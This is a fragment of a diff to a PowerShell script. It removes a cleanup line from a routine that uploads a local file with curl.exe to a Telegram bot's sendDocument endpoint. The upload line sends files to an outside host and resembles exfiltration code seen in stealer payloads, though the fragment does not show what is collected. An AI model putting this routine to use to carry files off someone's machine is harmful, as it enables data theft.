@@ -144,7 +144,6 @@ if (Test-Path -Path $path){
     }else{
         curl.exe -F chat_id="$ChatID" -F document=@"$Path" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
         Write-Output "File Upload Complete: $path"
-        Rm -Path $tempZipFilePath -Recurse -Force
     }
 }else{Write-Host "File Not Found: $path"}
 }
